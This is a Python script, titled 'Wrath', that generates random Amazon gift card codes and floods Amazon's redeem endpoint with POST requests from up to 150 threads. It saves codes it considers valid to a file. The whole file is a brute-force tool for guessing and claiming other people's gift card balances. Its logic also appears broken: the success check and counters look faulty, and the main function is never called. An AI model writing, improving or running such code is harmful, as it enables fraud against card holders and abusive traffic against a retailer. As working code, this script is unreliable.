import requests, threading, time, ctypes, string, random, sys
from colorama import init, Fore
import os
import pystyle 
from pystyle import *

def g(rolls):
	data = "qwertyuioplkjhgfdsazxcvbnm1234567890QWERTYUIOPLKJHGFDSAZXCVBNM"
	result = ""
	while rolls >= 1:
		c = random.choice(data)
		result = c + result
		rolls = rolls - 1
	return result


os.system('cls')
def amazonapp():
    init(convert=True)
    

 

   
    giftcards = []
    num = 0
    speed = (1/int(input(Colorate.Horizontal(Colors.red_to_green, "How Many Codes Per Second?: "))))

    def checker():
        try:
            valid = 0
            invalid = 0
            kll = (g(4)+"-"+g(6)+"-"+g(4))
            success_keyword = """ <b>Enter claim code</b> """
            r = requests.post("https://www.amazon.com/gc/redeem", data={"giftcard": kll})
            if success_keyword in r.text:
                valid += 1
                print(Fore.GREEN + '[VALID]:' + kll)
                mkj = open('valid.txt', 'a')
                mkj.write(kll)
                mkj.close()
                ctypes.windll.kernel32.SetConsoleTitleW("Wrath |"  + " | Valid: " + str(valid))
                os.system('pause >NUL')
            else:
                print(Fore.RED + '[INVALID]: ' + kll)
                invalid += 1
                ctypes.windll.kernel32.SetConsoleTitleW("Wrath | Valid: " + str(valid))
        except IndexError as e:
            sys.exit(0)

    while True:
        if threading.active_count() < 150:
            threading.Thread(target=checker, args=()).start()
            time.sleep(speed)
            num+=1
            

